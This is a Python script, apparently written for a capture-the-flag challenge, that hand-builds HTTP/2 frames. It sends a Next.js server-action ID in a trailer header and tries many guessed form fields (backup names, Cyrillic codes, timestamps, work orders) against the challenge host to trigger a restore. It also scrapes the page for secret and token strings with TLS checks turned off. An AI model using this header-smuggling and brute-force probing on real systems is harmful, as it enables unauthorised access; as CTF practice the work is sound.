#!/usr/bin/env python3
"""
Document traversal - try to find clues about required backup format or confirmation codes
by examining the webpage content more carefully
"""
import socket
import ssl
import struct
import time
import re
import json
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
    sock.sendall(PREFACE)
    settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    sock.sendall(settings_frame)
    return sock

def read_frames(sock, want_stream=1, max_time=10):
    frames = []
    end_time = time.time() + max_time
    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9:
                break
            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF
            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk
            frames.append((frame_type, flags, stream_id, payload))
            if stream_id == want_stream and (flags & 1):
                break
        except socket.timeout:
            break
        except Exception:
            break
    return frames, True

def parse_response(frames):
    body = b""
    status = None
    for frame_type, flags, stream_id, payload in frames:
        if frame_type == 1:  # HEADERS
            if b":status" in payload:
                try:
                    status_match = re.search(rb':status\x03(\d{3})', payload)
                    if status_match:
                        status = status_match.group(1).decode()
                except:
                    pass
        elif frame_type == 0:  # DATA
            body += payload
    return status or "200", {}, body

def send_formdata_payload(fields):
    """Send FormData with specific fields via HTTP/2 trailers"""
    sock = open_h2()
    sid = 1

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Build multipart body
    boundary = "----WebKitFormBoundaryTest123"
    parts = []

    for name, value in fields.items():
        parts.append(f"------WebKitFormBoundaryTest123\r\n")
        parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
        parts.append(f"{value}\r\n")

    parts.append("------WebKitFormBoundaryTest123--")
    body = "".join(parts).encode()

    content_type = f"multipart/form-data; boundary={boundary}"

    enc = Encoder()
    header_block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body))),
        ("trailer", "next-action"),
        ("user-agent", "probe37-formdata"),
    ])

    trailer_block = enc.encode([
        ("next-action", ACTION_ID),
    ])

    # Send frames
    raw = struct.pack(">I", len(header_block))[1:] + b"\x01" + b"\x04" + struct.pack(">I", sid) + header_block
    sock.sendall(raw)

    raw = struct.pack(">I", len(body))[1:] + b"\x00" + b"\x00" + struct.pack(">I", sid) + body
    sock.sendall(raw)

    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + b"\x05" + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames, _ = read_frames(sock, want_stream=sid, max_time=10)
    sock.close()

    return parse_response(frames)

def extract_row1(body):
    """Extract row 1 from RSC response"""
    body_str = body.decode('utf-8', errors='ignore')
    row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
    if row1_match:
        content = row1_match.group(1)
        if content.startswith('{') and content.endswith('}'):
            try:
                parsed = json.loads(content)
                return parsed
            except:
                pass
        return content
    return None

def analyze_page_content():
    """Analyze the page for clues about backup format"""
    print("[+] Fetching and analyzing page content...")

    # Get page content via HTTP/1.1 for easier parsing
    import requests
    try:
        resp = requests.get(f"https://{HOST}/", verify=False, timeout=10)
        content = resp.text
    except:
        print("    Failed to fetch page content")
        return

    print("\n[+] Looking for potential clues in page content...")

    # Look for backup-related strings
    backup_patterns = [
        r'backup.*?\.(\w+)',  # backup file extensions
        r'restore.*?code.*?(\w+)',  # restore codes
        r'пакет.*?(\w+-[\w.-]+)',  # package identifiers
        r'код.*?(\w+)',  # codes in Cyrillic
        r'secret.*?(\w+)',  # secrets
        r'token.*?(\w+)',  # tokens
    ]

    clues = []
    for pattern in backup_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            clues.extend(matches)

    if clues:
        print(f"    Found potential clues: {clues}")
    else:
        print("    No obvious backup-related clues found")

    # Look for hidden form fields or data
    hidden_data = re.findall(r'data-\w+="([^"]+)"', content)
    if hidden_data:
        print(f"    Found data attributes: {hidden_data[:5]}...")  # Limit output

    # Look for any base64 encoded data
    b64_pattern = r'([A-Za-z0-9+/]{20,}={0,2})'
    b64_matches = re.findall(b64_pattern, content)
    if b64_matches:
        print(f"    Found potential base64 data: {len(b64_matches)} matches")
        for match in b64_matches[:3]:  # Check first 3
            if len(match) > 20:
                try:
                    import base64
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    if decoded and not '\x00' in decoded:
                        print(f"    Decoded: {decoded[:50]}...")
                except:
                    pass

def main():
    print("=" * 60)
    print("Document Traversal - Looking for backup restore clues")
    print("=" * 60)

    # First analyze the page content
    analyze_page_content()

    print("\n[+] Testing legitimate backup restore approaches...")

    # Test cases based on the UI description
    test_cases = [
        # Basic backup-related fields
        ("backup_file", {"backup": "south-line.2026-03-27.bak"}),
        ("backup_restore", {"restore": "true", "backup": "south-line.2026-03-27"}),
        ("packet_restore", {"packet": "south-line.2026-03-27", "restore": "confirm"}),

        # Authorization codes (Cyrillic context)
        ("auth_code", {"code": "КУРАГУ"}),  # From the defaced display
        ("auth_code2", {"код": "ДРУЗЬЯМ"}),  # Second part
        ("auth_full", {"код": "КУРАГУ ДРУЗЬЯМ КУБАНИ"}),  # Full message

        # Service codes
        ("service_code", {"service_code": "ОП-3"}),
        ("terminal_code", {"terminal": "ОП-3", "code": "восстановление"}),

        # Timestamp-based codes (from logs)
        ("timestamp1", {"code": "05:44"}),
        ("timestamp2", {"code": "05:47"}),
        ("timestamp3", {"code": "05:56"}),

        # Equipment codes
        ("equipment", {"equipment": "lift-hvc-2", "restore": "true"}),
        ("plc_code", {"plc": "true", "шлюз": "восстановление"}),

        # Work order based
        ("work_order", {"work_order": "WO-17-04", "operation": "restore"}),
        ("packet_wo", {"packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "restore": "true"}),

        # Combination approaches
        ("full_context", {
            "packet": "south-line.2026-03-27",
            "workOrder": "WO-17-04",
            "terminal": "ОП-3",
            "code": "КУРАГУ",
            "restore": "true"
        }),
    ]

    for test_name, fields in test_cases:
        print(f"\n[{test_name}] Testing: {fields}")
        try:
            status, headers, body = send_formdata_payload(fields)
            result = extract_row1(body)

            if result:
                if isinstance(result, dict):
                    if result.get("ok"):
                        print(f"    SUCCESS: {result}")
                        return  # Found it!
                    elif result.get("error") == "recovery-offline":
                        print(f"    Still recovery-offline: {result.get('message', 'N/A')}")
                    else:
                        print(f"    Response: {result}")
                else:
                    print(f"    Raw result: {result}")
            else:
                print(f"    No row1 found in response (status: {status})")

        except Exception as e:
            print(f"    ERROR: {e}")

    print("\n" + "=" * 60)
    print("Document traversal complete. If no success, may need different approach.")

if __name__ == "__main__":
    main()